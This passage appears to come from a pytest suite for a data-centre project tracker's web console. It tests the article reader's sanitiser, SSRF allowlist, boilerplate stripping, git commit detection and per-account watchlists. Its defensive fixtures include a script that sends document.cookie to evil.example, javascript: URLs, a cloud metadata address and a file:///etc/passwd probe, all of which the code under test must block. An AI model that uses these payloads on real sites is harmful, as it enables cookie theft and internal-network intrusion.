     the largest single sites announced in the state this year.</p>
  {_FILLER}
  <p><a href="/more">Read more</a> about the project and its grid connection timeline.</p>
  <img src="/img/site.jpg" alt="The site">
</article>
<footer>Copyright and terms of use</footer></body></html>"""

FAIRWATER = "https://news.microsoft.com/fairwater/"


@pytest.fixture
def reader_dirs(tmp_path):
    """`(article cache, reader cache)`, both empty."""
    return tmp_path / "articles", tmp_path / "reader"


def _load(db_path, url, dirs, **kw):
    from tracker.db import open_db
    from tracker.webui import article

    engine = open_db(db_path, readonly=True)
    with session_scope(engine, commit=False) as session:
        return article.load(session, url, cache_dir=dirs[0], reader_dir=dirs[1], **kw)


def _long_quote(db_path, quote):
    """Give the seeded source a sentence-length quote.

    The fixture's own is 16 characters, under the floor a mark is worth drawing
    at. A real evidence quote is a sentence.
    """
    from tracker.db import make_engine
    from tracker.models import Source

    with session_scope(make_engine(db_path)) as session:
        session.query(Source).one().quotes = json.dumps({"mw_planned": quote})


def test_the_reader_refuses_a_url_the_database_does_not_cite(seeded_db, reader_dirs):
    """The allowlist is the database itself, and that is the whole access rule.

    Without it the console is a request forwarder aimed at whatever network it
    runs on — `?url=http://169.254.169.254/...` fetched and rendered back.
    Nothing about "it only reads" limits where a reader may be pointed.
    """
    found = _load(seeded_db, "https://evil.example/internal", reader_dirs)
    assert found.body == ""
    assert "not cited" in found.error


def test_the_reader_keeps_the_article_and_drops_the_furniture(seeded_db, reader_dirs, monkeypatch):
    from tracker.webui import article

    monkeypatch.setattr(article, "_get", lambda url: (ARTICLE_HTML, ""))
    found = _load(seeded_db, FAIRWATER, reader_dirs)
    assert found.via == "reader"
    assert "Mount Pleasant" in found.body and "<h2>" in found.body
    # The navigation and the footer are not the article.
    assert "Search" not in found.body and "Copyright" not in found.body


def test_the_reader_strips_script_and_every_attribute_it_does_not_name(
    seeded_db, reader_dirs, monkeypatch
):
    """An allowlist, not a blocklist — so a construct nobody anticipated goes too.

    This is the first of three independent guards. The frame that holds the
    result is sandboxed with no `allow-` tokens, and the response carries
    `default-src 'none'`; any one of the three would do, and rendering somebody
    else's markup deserves all three.
    """
    from tracker.webui import article

    hostile = """<html><body><article>
      <p onclick="steal()" style="position:fixed" data-track="1">Mount Pleasant groundbreaking
         confirmed by the company this week, with construction already under way.</p>
      <script>fetch('//evil.example?c='+document.cookie)</script>
      <iframe src="//evil.example"></iframe>
      <form action="//evil.example"><input name="p"></form>
      <a href="javascript:alert(1)">click</a>
      <img src="javascript:alert(2)">
    </article></body></html>"""
    monkeypatch.setattr(article, "_get", lambda url: (hostile, ""))
    body = _load(seeded_db, FAIRWATER, reader_dirs).body
    for banned in ("<script", "<iframe", "<form", "<input", "onclick", "javascript:", "data-track"):
        assert banned not in body, banned
    assert "Mount Pleasant" in body


def test_a_stored_quote_is_marked_where_the_article_really_says_it(
    seeded_db, reader_dirs, monkeypatch
):
    """Marking survives an inline tag splitting the sentence.

    "The <em>campus</em> will draw 900 MW" is one sentence to a reader and three
    nodes to a parser, which is the case a naive text search silently misses.
    """
    from tracker.webui import article

    _long_quote(seeded_db, "will draw 900 MW at full build, the company said")
    monkeypatch.setattr(article, "_get", lambda url: (ARTICLE_HTML, ""))
    found = _load(seeded_db, FAIRWATER, reader_dirs)
    assert found.marks == 1
    assert 'data-field="mw_planned"' in found.body
    assert "will draw 900 MW at full build, the company said" in found.body


def test_a_quote_absent_from_the_page_is_not_marked_anyway(seeded_db, reader_dirs, monkeypatch):
    """No fuzzy fallback here, deliberately.

    The gate recovers a near-miss when it is deciding whether to *store* a value,
    because the model resolves pronouns while quoting. Drawing a highlight makes
    a different claim — "this sentence is the evidence" — so if the page has
    changed since it was cited, no mark is the honest outcome rather than a mark
    over the nearest similar sentence.
    """
    from tracker.webui import article

    _long_quote(seeded_db, "will draw 1,400 MW at full build, the company said")
    monkeypatch.setattr(article, "_get", lambda url: (ARTICLE_HTML, ""))
    found = _load(seeded_db, FAIRWATER, reader_dirs)
    assert found.marks == 0 and "<mark" not in found.body


def test_only_whitespace_and_case_are_forgiven_when_marking(seeded_db, reader_dirs, monkeypatch):
    """One rendering of a sentence differs from another by wrapping and case,
    never by words."""
    from tracker.webui import article

    _long_quote(seeded_db, "WILL   DRAW\n 900 MW at full build, the company said")
    monkeypatch.setattr(article, "_get", lambda url: (ARTICLE_HTML, ""))
    assert _load(seeded_db, FAIRWATER, reader_dirs).marks == 1


def test_the_second_open_costs_no_request(seeded_db, reader_dirs, monkeypatch):
    from tracker.webui import article

    calls = []

    def once(url):
        calls.append(url)
        return ARTICLE_HTML, ""

    monkeypatch.setattr(article, "_get", once)
    _load(seeded_db, FAIRWATER, reader_dirs)
    second = _load(seeded_db, FAIRWATER, reader_dirs)
    assert len(calls) == 1
    assert second.via == "reader-cache" and "Mount Pleasant" in second.body


def test_the_reader_falls_back_to_stored_text_rather_than_an_empty_pane(
    seeded_db, reader_dirs, monkeypatch
):
    """The library may be absent, the fetch may fail, the page may hold no
    article. The excerpt is a few hundred characters, but it is never nothing."""
    from tracker.webui import article

    monkeypatch.setattr(article, "_get", lambda url: ("", "the publisher answered 403"))
    found = _load(seeded_db, FAIRWATER, reader_dirs)
    assert found.via == "excerpt" and "900 MW" in found.body


def test_the_rendered_document_locks_itself_down(seeded_db, reader_dirs, monkeypatch):
    from tracker.webui import article

    monkeypatch.setattr(article, "_get", lambda url: (ARTICLE_HTML, ""))
    found = _load(seeded_db, FAIRWATER, reader_dirs)
    page = article.render(found)
    assert "default-src 'none'" in page
    assert 'name="referrer" content="no-referrer"' in page
    assert '<html lang="en" data-theme="light">' in page
    assert '<html lang="en" data-theme="dark">' in article.render(found, dark=True)


def test_the_article_route_validates_before_it_reaches_the_database(server):
    address, _ = server
    status, body = request(address, "/api/article")
    assert status == 400 and "url is required" in body["error"]
    status, body = request(address, "/api/article?url=file:///etc/passwd")
    assert status == 400 and "http or https" in body["error"]
    status, body = request(address, "/api/article?url=https%3A%2F%2Fevil.example%2Fx")
    assert status == 404 and "not cited" in body["error"]


def test_the_reader_response_replaces_the_consoles_policy_rather_than_adding_to_it(
    server, monkeypatch
):
    """Two CSP headers are intersected by the browser, not merged.

    The reader needs `img-src https:` and the console's policy says
    `img-src 'self'`; sending both would permit no images at all — a stricter
    result than either policy asks for, arrived at silently.
    """
    from tracker.webui import article

    monkeypatch.setattr(article, "_get", lambda url: (ARTICLE_HTML, ""))
    headers = headers_for(
        server[0], "/api/article?url=https%3A%2F%2Fnews.microsoft.com%2Ffairwater%2F"
    )
    policy = headers["content-security-policy"]
    assert policy.count("default-src") == 1
    assert "default-src 'none'" in policy and "img-src https: data:" in policy
    assert headers["content-type"].startswith("text/html")


def test_the_console_keeps_its_own_policy_everywhere_else(server):
    policy = headers_for(server[0], "/api/health")["content-security-policy"]
    assert "default-src 'self'" in policy and "default-src 'none'" not in policy


def test_the_reader_frame_is_sandboxed_with_no_allow_tokens():
    """It loads same-origin, so without this the document could script the
    console. `sandbox=""` gives it an opaque origin and no script at all."""
    source = (assets.STATIC_ROOT / "app.js").read_text(encoding="utf-8")
    assert 'src=${readerSrc} sandbox=""' in source


# --- Throwing away the furniture ---------------------------------------------
#
# Readability finds the article by text density and is indifferent to what shares
# a container with it. Two passes bracket it: named chrome removed before it can
# be scored, and the seams trimmed after.
#
# The kill criterion for the whole pass, fixed before it was written: **it must
# not cost a single marked quote.** Measured over fifteen publishers it cuts 101
# lines and keeps all 25.

CHROME_HTML = """<html><head><title>T</title></head>
<body class="wp-singular single single-news postid-2673 no-sidebar">
<nav class="navbar"><a href="/a">Home</a></nav>
<div class="ad-slot">Buy this thing</div>
<div class="share-bar">Share on LinkedIn</div>
<article class="post-content">
  <h2>Ground broken at Mount Pleasant</h2>
  {body}
</article>
<div class="related-posts"><h3>Related</h3><a href="/z">Another story</a></div>
<div id="disqus_thread">Comments go here</div>
<footer class="site-footer">Copyright and terms of use</footer>
</body></html>"""

PROSE = (
    "<p>Microsoft broke ground at Mount Pleasant this week, the company confirmed on "
    "Tuesday after months of speculation about the site and its eventual size.</p>"
    "<p>The <em>campus</em> will draw 900 MW at full build, the company said, making it "
    "one of the largest single sites announced in the state this year.</p>"
) + (
    "<p>Construction is expected to run through the following two years, with the first "
    "halls energised ahead of the remainder of the campus, according to filings reviewed "
    "by this publication and people familiar with the schedule.</p>"
) * 6


def _read_html(seeded_db, reader_dirs, monkeypatch, page):
    from tracker.webui import article

    monkeypatch.setattr(article, "_get", lambda url: (page, ""))
    return _load(seeded_db, FAIRWATER, reader_dirs)


def test_named_chrome_never_reaches_the_reader(seeded_db, reader_dirs, monkeypatch):
    """Ads, share rails, nav, related lists, comments and the footer, by name."""
    body = _read_html(seeded_db, reader_dirs, monkeypatch, CHROME_HTML.format(body=PROSE)).body
    for junk in (
        "Buy this thing",
        "Share on LinkedIn",
        "Another story",
        "Comments go here",
        "Copyright and terms",
        "Home",
    ):
        assert junk not in body, junk
    assert "Mount Pleasant" in body and "900 MW" in body


def test_a_class_name_on_the_body_does_not_delete_the_document(seeded_db, reader_dirs, monkeypatch):
    """`no-sidebar` in a WordPress body class matched the `sidebar` rule.

    Dropping it took the article with it, and the pass reported success —
    `stackinfra.com` came back empty. Structural elements are exempt from name
    matching, and so is anything holding most of the page's prose.
    """
    body = _read_html(seeded_db, reader_dirs, monkeypatch, CHROME_HTML.format(body=PROSE)).body
    assert "Mount Pleasant" in body


def test_a_container_too_large_to_be_chrome_is_kept_whatever_it_is_called(
    seeded_db, reader_dirs, monkeypatch
):
    """The general form of the same mistake: chrome is never most of a page."""
    page = CHROME_HTML.format(body=f'<div class="promo">{PROSE}</div>')
    assert "Mount Pleasant" in _read_html(seeded_db, reader_dirs, monkeypatch, page).body


def test_a_stop_heading_ends_the_article(seeded_db, reader_dirs, monkeypatch):
    """A Q&A or "Related stories" block that survived the class pass is cut at
    its heading, along with everything after it."""
    page = CHROME_HTML.format(
        body=PROSE + "<h3>Frequently Asked Questions</h3>"
        "<p>How big is it? Very big indeed, and here is a long answer about that.</p>"
        "<p>Who pays for the substation upgrades that the campus is going to need?</p>"
    )
    body = _read_html(seeded_db, reader_dirs, monkeypatch, page).body
    assert "Mount Pleasant" in body and "900 MW" in body
    assert "Frequently Asked" not in body and "How big is it" not in body


def test_cutting_the_tail_keeps_everything_before_it(seeded_db, reader_dirs, monkeypatch):
    """The ancestors are walked, never removed.

    A first attempt deleted the parent that still held everything kept so far, so
    three publishers came back completely empty while the pass reported success.
    """
    page = CHROME_HTML.format(
        body=f"<div><div>{PROSE}</div><div><h3>Related Articles</h3>"
        f"<p>Some other story entirely, of no relevance to this one at all.</p>"
        f"</div></div>"
    )
    body = _read_html(seeded_db, reader_dirs, monkeypatch, page).body
    assert body.count("<p>") >= 7
    assert "Related Articles" not in body and "no relevance" not in body


def test_a_signpost_goes_even_when_it_wraps_a_link(seeded_db, reader_dirs, monkeypatch):
    """ "For more information, visit <a>example.com</a>" is one sentence to a
    reader and a parent plus a child to a parser. Judging elements with children
    by their children alone let every press release keep its sign-off."""
    page = CHROME_HTML.format(
        body=PROSE + '<p>For more information, visit <a href="https://x.example">x</a></p>'
        "<p>READ MORE: Northern California Data Centers</p>"
    )
    body = _read_html(seeded_db, reader_dirs, monkeypatch, page).body
    assert "For more information" not in body and "READ MORE" not in body
    assert "Mount Pleasant" in body


def test_a_sentence_merely_mentioning_a_signpost_word_survives(seeded_db, reader_dirs, monkeypatch):
    """The junk rules are anchored. "Sources close to the project said…" is
    reporting, not a sources list."""
    keep = (
        "<p>Sources close to the project said the substation contract had not yet "
        "been awarded, and that more information was expected within weeks.</p>"
    )
    body = _read_html(
        seeded_db, reader_dirs, monkeypatch, CHROME_HTML.format(body=PROSE + keep)
    ).body
    assert "Sources close to the project" in body


def test_mojibake_the_publisher_baked_in_is_repaired(seeded_db, reader_dirs, monkeypatch):
    """`datacenterknowledge.com` serves "Cote dâ€™Ivoire" — valid UTF-8
    encoding three characters that were themselves a mis-decode upstream."""
    page = CHROME_HTML.format(
        body=PROSE + "<p>The campus in Cote dâ€™Ivoire opened, and "
        "â€œit changed everythingâ€, the operator said.</p>"
    )
    body = _read_html(seeded_db, reader_dirs, monkeypatch, page).body
    assert "Cote d’Ivoire" in body
    assert "“it changed everything”" in body


def test_real_accents_are_never_mistaken_for_mojibake():
    """The repair is kept only when the run round-trips, so text that was never
    double-encoded comes back untouched."""
    from tracker.webui import article

    for intact in (
        "Café naïve résumé Über",
        "It’s “fine” — really",
        "数据中心",
        "Nothing wrong here",
    ):
        assert article._demojibake(intact) == intact


def test_valid_utf8_beats_a_wrong_declaration():
    """Believing the page is the obvious rule and the wrong one.

    A page that declares Latin-1 and serves UTF-8 decodes *without error* as
    Latin-1 — every byte is a valid character — so a declaration-first order
    produces mojibake silently, with no exception to fall through.
    """
    from tracker.webui import article

    raw = '<meta charset="iso-8859-1"><p>Cote d’Ivoire</p>'.encode()
    assert "Cote d’Ivoire" in article._decode(raw, "text/html; charset=iso-8859-1")


def test_a_page_that_really_is_latin1_still_decodes():
    from tracker.webui import article

    raw = "<p>Café naïve</p>".encode("latin-1")
    assert "Café naïve" in article._decode(raw, "text/html; charset=iso-8859-1")


def test_health_reports_the_commit_it_is_serving(server):
    """Which version is in production is a question the deploy pipeline created.

    Code reaches the host by a poller rather than by a person, so "is my fix live
    yet?" has no answer at the keyboard, and a restart is not proof that the
    restart picked up the intended commit.
    """
    import subprocess

    from tracker.webui.server import deployed_commit

    status, body = request(server[0], "/api/health")
    assert status == 200 and body["ok"] is True
    expected = subprocess.run(
        ["git", "rev-parse", "--short=8", "HEAD"], capture_output=True, text=True
    ).stdout.strip()
    if expected:  # a tarball install has no .git, and reports None
        assert body["commit"] == expected == deployed_commit()


# --- reading the commit out of `.git`, in all three layouts -------------------
#
# The health endpoint answers "is my fix live yet?", and it reads `.git` directly
# rather than shelling out because it answers on every health check.
#
# That read assumed `.git` is a directory. In a git worktree it is a *file* holding
# `gitdir: <path>`, so `.git/HEAD` raises `NotADirectoryError` and the commit came
# back as unknown. Harmless in production, which is an ordinary checkout — and
# corrosive everywhere else, because this project is worked on in worktrees, so the
# test above failed on every single run and the deploy runbook had to name it as an
# expected failure. A suite that is always one red is a suite nobody reads.


def _fake_checkout(root, *, head="ref: refs/heads/main", sha="abcdef1234567890"):
    """An ordinary checkout: `.git` is a directory holding HEAD and the refs."""
    git = root / ".git"
    (git / "refs" / "heads").mkdir(parents=True)
    (git / "HEAD").write_text(head + "\n", encoding="utf-8")
    (git / "refs" / "heads" / "main").write_text(sha + "\n", encoding="utf-8")
    return git


def _fake_worktree(root, common_root, *, branch="feature/x", sha="1234567890abcdef"):
    """A worktree: `.git` is a file, HEAD is private, refs are shared.

    Mirrors what git actually writes — the branch file lives under the *common*
    directory, and the worktree's gitdir only carries `HEAD` and `commondir`.
    """
    common = _fake_checkout(common_root, sha="0000000000000000")
    gitdir = common / "worktrees" / "wt"
    gitdir.mkdir(parents=True)
    (gitdir / "HEAD").write_text(f"ref: refs/heads/{branch}\n", encoding="utf-8")
    (gitdir / "commondir").write_text("../..\n", encoding="utf-8")
    ref = common / "refs" / "heads" / branch
    ref.parent.mkdir(parents=True, exist_ok=True)
    ref.write_text(sha + "\n", encoding="utf-8")
    (root / ".git").write_text(f"gitdir: {gitdir}\n", encoding="utf-8")
    return gitdir, common


@pytest.fixture
def _at(monkeypatch):
    """Point the server's idea of the install root at a directory, uncached."""

    def use(root):
        from tracker.webui import server as server_mod

        monkeypatch.setattr(server_mod, "home", lambda: root)
        server_mod.deployed_commit.cache_clear()
        return server_mod

    yield use
    from tracker.webui import server as server_mod

    server_mod.deployed_commit.cache_clear()


def test_an_ordinary_checkout_reads_its_head(tmp_path, _at):
    root = tmp_path / "repo"
    root.mkdir()
    _fake_checkout(root)
    assert _at(root).deployed_commit() == "abcdef12"


def test_a_worktree_reads_its_own_head_not_the_main_checkouts(tmp_path, _at):
    """The bug. `.git` is a file, so the old read raised and reported nothing —
    and resolving the branch against the worktree's own gitdir finds nothing
    either, because refs are shared."""
    root = tmp_path / "wt"
    root.mkdir()
    _fake_worktree(root, tmp_path / "main")
    assert _at(root).deployed_commit() == "12345678"


def test_a_worktree_whose_pointer_is_relative(tmp_path, _at):
    """Git writes this absolute in some versions and relative in others."""
    root = tmp_path / "wt"
    root.mkdir()
    gitdir, _ = _fake_worktree(root, tmp_path / "main")
    import os

    (root / ".git").write_text(
        f"gitdir: {os.path.relpath(gitdir, root)}\n".replace("\\", "/"), encoding="utf-8"
    )
    assert _at(root).deployed_commit() == "12345678"


def test_a_packed_ref_is_found_in_the_shared_directory(tmp_path, _at):
    """`git gc` removes the loose file. In a worktree `packed-refs` is the main
    checkout's, so looking for it beside HEAD finds nothing."""
    root = tmp_path / "wt"
    root.mkdir()
    _, common = _fake_worktree(root, tmp_path / "main")
    (common / "refs" / "heads" / "feature" / "x").unlink()
    (common / "packed-refs").write_text(
        "# pack-refs with: peeled fully-peeled sorted\n"
        "1234567890abcdef1234567890abcdef12345678 refs/heads/feature/x\n",
        encoding="utf-8",
    )
    assert _at(root).deployed_commit() == "12345678"


def test_a_detached_head_reports_the_sha_it_is_on(tmp_path, _at):
    root = tmp_path / "repo"
    root.mkdir()
    _fake_checkout(root, head="deadbeefcafebabe")
    assert _at(root).deployed_commit() == "deadbeef"


def test_no_checkout_at_all_reports_nothing(tmp_path, _at):
    """A tarball install has no `.git`, and the endpoint says so rather than
    raising on a health check."""
    root = tmp_path / "tarball"
    root.mkdir()
    assert _at(root).deployed_commit() is None


def test_a_git_file_pointing_nowhere_reports_nothing(tmp_path, _at):
    """Whatever is wrong with the checkout, the health endpoint must answer."""
    root = tmp_path / "broken"
    root.mkdir()
    (root / ".git").write_text("gitdir: /nowhere/at/all\n", encoding="utf-8")
    assert _at(root).deployed_commit() is None


def test_an_unreadable_git_file_reports_nothing(tmp_path, _at):
    root = tmp_path / "odd"
    root.mkdir()
    (root / ".git").write_text("this is not a gitdir pointer\n", encoding="utf-8")
    assert _at(root).deployed_commit() is None


# --- the watchlist, the one write on the reading console --------------------
#
# **Every test here needs somebody signed in**, which is the change: a watchlist
# belongs to an account, so there is no such thing as "the" list any more. The
# `reader` fixture is a console with one account on it and a cookie for that
# account; `as_reader` is `request` with the cookie attached.


@pytest.fixture
def reader(seeded_db):
    """A console with one account, and a session cookie for it."""
    from http.server import ThreadingHTTPServer

    account_id = _account(seeded_db)
    console = Console(seeded_db)
    handler = type("Bound", (Handler,), {"console": console})
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    httpd.daemon_threads = True
    threading.Thread(target=httpd.serve_forever, kwargs=FAST_POLL, daemon=True).start()
    try:
        address = httpd.server_address
        status, cookie = sign_in(address)
        assert status == 200, "the fixture could not sign in"
        yield address, console, cookie, account_id
    finally:
        httpd.shutdown()
        httpd.server_close()
        console.close()


def as_reader(address, cookie, path, method="GET", body=None):
    """`request`, with a session on it."""
    status, _headers, payload = raw(address, path, method, body, cookie=cookie)
    try:
        return status, json.loads(payload)
    except ValueError:
        return status, payload


def test_a_watchlist_needs_an_account_not_merely_a_session(server):
    """On a console with nobody signed in there is no list to edit.

    An unowned watch is the shared list that accounts exist to replace, so the
    refusal says that rather than inventing an owner — and `/api/updates` still
    answers, with the whole database, which is what an anonymous reader wants.
    """
    address, _ = server
    status, body = request(
        address, "/api/watch", method="POST", body={"action": "add", "entry": "xAI"}
    )
    assert status == 403
    assert "belongs to an account" in body["error"]

    _status, updates = request(address, "/api/updates")
    assert updates["watching_everything"] is True
    assert updates["allow_watch"] is False, "so the page draws no editor"


def test_two_readers_do_not_see_each_other_s_list(seeded_db):
    """The property the whole change is for."""
    from http.server import ThreadingHTTPServer

    _account(seeded_db, "alice@example.com")
    _account(seeded_db, "bob@example.com")
    console = Console(seeded_db)
    handler = type("Bound", (Handler,), {"console": console})
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    httpd.daemon_threads = True
    threading.Thread(target=httpd.serve_forever, kwargs=FAST_POLL, daemon=True).start()
    try:
        address = httpd.server_address
        _, alice = sign_in(address, email="alice@example.com")
        _, bob = sign_in(address, email="bob@example.com")

        as_reader(address, alice, "/api/watch", "POST", {"action": "add", "entry": "Microsoft"})
        _status, hers = as_reader(
            address, bob, "/api/watch", "POST", {"action": "add", "entry": "xAI"}
        )
        assert [w["entry"] for w in hers["watchlist"]] == ["xAI"], "bob sees only his"

        _status, mine = as_reader(address, alice, "/api/updates?days=36500")
        assert [w["entry"] for w in mine["watchlist"]] == ["Microsoft"]

        # And one cannot drop the other's entry.
        _status, dropped = as_reader(
            address, bob, "/api/watch", "POST", {"action": "remove", "entry": "Microsoft"}
        )
        assert dropped["removed"] is False
        _status, still = as_reader(address, alice, "/api/updates?days=36500")
        assert [w["entry"] for w in still["watchlist"]] == ["Microsoft"]

        # Nor does the payload carry whose it is.
        assert "owner" not in still["watchlist"][0]
    finally:
        httpd.shutdown()
        httpd.server_close()


def test_the_watchlist_write_lands_in_the_database(reader, seeded_db):
    """The page and `tracker watch` are one list, so this checks the row itself."""
    from sqlalchemy import select

    from tracker.db import open_db, session_scope
    from tracker.models import Watch

    address, _console, cookie, account_id = reader
    status, body = as_reader(
        address, cookie, "/api/watch", "POST", {"action": "add", "entry": "Microsoft"}
    )
    assert status == 200
    assert body["created"] is True
    assert [w["entry"] for w in body["watchlist"]] == ["Microsoft"]

    with session_scope(open_db(seeded_db), commit=False) as session:
        rows = session.scalars(select(Watch)).all()
        assert [(r.entry, r.company_key, r.account_id) for r in rows] == [
            ("Microsoft", "microsoft", account_id)
        ], "the row is filed under whoever wrote it"

    # And the digest narrows to it, which is the whole point of writing it.
    _status, updates = as_reader(address, cookie, "/api/updates?days=36500")
    assert updates["watching_everything"] is False
    assert [e["entry"] for e in updates["entities"]] == ["Microsoft"]


def test_the_watchlist_write_answers_rather_than_hanging(reader):
    """It shipped reading the request body twice, which blocks on `rfile` forever.

    `do_POST` reads the body once, up front, and every route below takes that
    value — there is a comment there saying so, and this route was written against
    it. A 30-second client timeout in `request` is what makes this a failure rather
    than a hung suite.
    """
    address, _console, cookie, _id = reader
    status, _body = as_reader(
        address, cookie, "/api/watch", "POST", {"action": "add", "entry": "Google"}
    )
    assert status == 200


def test_removing_a_watch(reader):
    address, _console, cookie, _id = reader
    as_reader(address, cookie, "/api/watch", "POST", {"action": "add", "entry": "Meta"})
    status, body = as_reader(
        address, cookie, "/api/watch", "POST", {"action": "remove", "entry": "meta"}
    )
    assert status == 200 and body["removed"] is True and body["watchlist"] == []


def test_the_watchlist_write_refuses_what_it_cannot_store(reader):
    """A 400 with a reason, not a 500 and not a silent no-op."""
    address, _console, cookie, _id = reader
    for body in (
        {"action": "sudo", "entry": "xAI"},
        {"action": "add", "entry": ""},
        {"action": "add"},
        {"action": "add", "entry": " | Colossus"},
        {"action": "add", "entry": "xAI", "note": {"not": "a string"}},
    ):
        status, _ = as_reader(address, cookie, "/api/watch", "POST", body)
        assert status == 400, body


def test_the_watchlist_write_can_be_switched_off(seeded_db):
    """`--no-watch-edits` for a deployment that wants the page strictly read-only.

    It wins over having an account, which is the ordering that matters: the flag
    is the operator's decision about the deployment and a session is not.
    """
    from http.server import ThreadingHTTPServer

    _account(seeded_db)
    console = Console(seeded_db, allow_watch=False)
    handler = type("Bound", (Handler,), {"console": console})
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    httpd.daemon_threads = True
    thread = threading.Thread(target=httpd.serve_forever, kwargs=FAST_POLL, daemon=True)
    thread.start()
    try:
        address = httpd.server_address
        _, cookie = sign_in(address)
        status, _ = as_reader(
            address, cookie, "/api/watch", "POST", {"action": "add", "entry": "xAI"}
        )
        assert status == 403
        # The page is told, so it does not render an editor that cannot work.
        _status, updates = as_reader(address, cookie, "/api/updates")
        assert updates["allow_watch"] is False
    finally:
        httpd.shutdown()
        httpd.server_close()


def test_the_one_write_is_still_a_write(seeded_db):
    """The console reads, with exactly one exception, and this is it.

    A watch cannot touch a project, a citation or a figure, cannot start a run —
    there is nothing left to start — and cannot spend a token. That narrowness is
    the whole argument for allowing it at all on a published page.
    """
    from http.server import ThreadingHTTPServer

    _account(seeded_db)
    console = Console(seeded_db)
    handler = type("Bound", (Handler,), {"console": console})
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    httpd.daemon_threads = True
    thread = threading.Thread(target=httpd.serve_forever, kwargs=FAST_POLL, daemon=True)
    thread.start()
    try:
        address = httpd.server_address
        assert console.allow_watch is True
        _, cookie = sign_in(address)
        status, _ = as_reader(
            address, cookie, "/api/watch", "POST", {"action": "add", "entry": "xAI"}
        )
        assert status == 200
        # ... and there is no run route to reach at all.
        status, _ = as_reader(address, cookie, "/api/run", "POST", {"cmd": "stats", "flags": {}})
        assert status == 404
    finally:
        httpd.shutdown()
        httpd.server_close()


def test_watch_all_is_off_by_default_and_toggles_per_account(seeded_db):
    """The button behind "watch everything", and the default 0022 inverted.

    An empty watchlist used to mean the whole database, so two accounts that had
    asked for nothing saw identical full pages — indistinguishable from a list
    that had leaked between them. Now it means nothing, and wanting all of it is a
    thing one person turns on without touching anybody else's page.
    """
    import threading
    from http.server import ThreadingHTTPServer

    _account(seeded_db, "alice@example.com")
    _account(seeded_db, "bob@example.com")
    console = Console(seeded_db)
    handler = type("Bound", (Handler,), {"console": console})
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    httpd.daemon_threads = True
    threading.Thread(target=httpd.serve_forever, kwargs=FAST_POLL, daemon=True).start()
    try:
        address = httpd.server_address
        _, alice = sign_in(address, email="alice@example.com")
        _, bob = sign_in(address, email="bob@example.com")

        _status, before = as_reader(address, alice, "/api/updates?days=36500")
        assert before["watch_all"] is False, "off by default"
        assert before["watching_everything"] is False, "an empty list watches nothing"
        assert before["projects_watched"] == 0

        _status, on = as_reader(
            address, alice, "/api/watch", "POST", {"action": "watch_all", "value": True}
        )
        assert on["watch_all"] is True

        _status, hers = as_reader(address, alice, "/api/updates?days=36500")
        assert hers["watching_everything"] is True
        assert hers["projects_watched"] > 0, "she asked for all of them"

        # Bob's page is untouched — the whole point of storing it per account.
        _status, his = as_reader(address, bob, "/api/updates?days=36500")
        assert his["watch_all"] is False
        assert his["projects_watched"] == 0

        _status, off = as_reader(
            address, alice, "/api/watch", "POST", {"action": "watch_all", "value": False}
        )
        assert off["watch_all"] is False
        _status, after = as_reader(address, alice, "/api/updates?days=36500")
        assert after["projects_watched"] == 0, "and it goes back"
    finally:
        httpd.shutdown()


def test_watch_all_refuses_a_value_that_is_not_a_boolean(seeded_db):
    """It decides which rows the server reads, so it takes true or false and
    nothing that has to be guessed at."""
    import threading
    from http.server import ThreadingHTTPServer

    _account(seeded_db, "alice@example.com")
    console = Console(seeded_db)
    handler = type("Bound", (Handler,), {"console": console})
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    httpd.daemon_threads = True
    threading.Thread(target=httpd.serve_forever, kwargs=FAST_POLL, daemon=True).start()
    try:
        address = httpd.server_address
        _, alice = sign_in(address, email="alice@example.com")
        status, body = as_reader(
            address, alice, "/api/watch", "POST", {"action": "watch_all", "value": "yes"}
        )
        assert status == 400
        assert "true or false" in body["error"]
    finally:
        httpd.shutdown()


# --- the table asks the server ----------------------------------------------
#
# Everything below pins a behaviour that used to happen in the browser, over a
# payload holding every project. The move is only safe if the answers did not
# change with it: a reader who types the same query and gets different rows has
# caught the console lying, and nothing on screen would say which half was wrong.


@pytest.fixture
def many(tmp_path, migrated_copy):
    """Seventy projects, enough to page three times and to sort meaningfully."""
    path = migrated_copy(tmp_path / "many.db")
    engine, _ = init_db(path)
    states = ["WI", "OH", "TX", "VA", "ND"]
    with session_scope(engine) as session:
        for i in range(70):
            # Every row a distinct campus: `dedup_key` is company|locality|state,
            # so a shared city under a shared operator would merge them and the
            # page sizes below would be measuring the merge, not the paging.
            claims = {
                "name": f"Campus {i:02d}",
                "company": "Meta" if i % 3 == 0 else f"Operator {i % 7}",
                "city": f"Columbus {i}" if i % 3 == 0 else f"Town {i}",
                "state": states[i % len(states)],
                "phase": "construction" if i % 2 else "announced",
            }
            # Two thirds carry a capacity, so "nulls last" has something to say.
            if i % 3:
                claims["mw_planned"] = float(100 + i * 7)
            session_record = IngestRecord(
                project={k: claims[k] for k in ("company", "name", "city", "state")},
                sources=[
                    SourceRecord(
                        url=f"https://example.test/campus-{i}",
                        source_type="trade_press",
                        fetched_at=T0,
                        excerpt=f"Campus {i:02d} will draw {100 + i * 7} MW.",
                        claims=claims,
                        quotes={"mw_planned": f"will draw {100 + i * 7} MW"},
                    )
                ],
            )
            upsert_record(session, session_record)
        # One campus whose *name* carries a number, so "42" and "#42" cannot be
        # the same question by accident.
        upsert_record(
            session,
            IngestRecord(
                project={
                    "company": "Anchor Power",
                    "name": "Route 42 Campus",
                    "city": "Anchorage",
                    "state": "AK",
                },
                sources=[
                    SourceRecord(
                        url="https://example.test/route-42",
                        source_type="trade_press",
                        fetched_at=T0,
                        excerpt="Route 42 Campus is planned.",
                        claims={
                            "name": "Route 42 Campus",
                            "company": "Anchor Power",
                            "city": "Anchorage",
                            "state": "AK",
                        },
                    )
                ],
            ),
        )
    return path


@pytest.fixture
def paged(many):
    """A console over the seventy."""
    from http.server import ThreadingHTTPServer

    console = Console(many)
    handler = type("Bound", (Handler,), {"console": console})
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    httpd.daemon_threads = True
    thread = threading.Thread(target=httpd.serve_forever, kwargs=FAST_POLL, daemon=True)
    thread.start()
    try:
        yield httpd.server_address
    finally:
        httpd.shutdown()
        httpd.server_close()
        console.close()


def test_the_table_arrives_thirty_rows_at_a_time(paged):
    """The first page is thirty rows and a count of the whole thing.

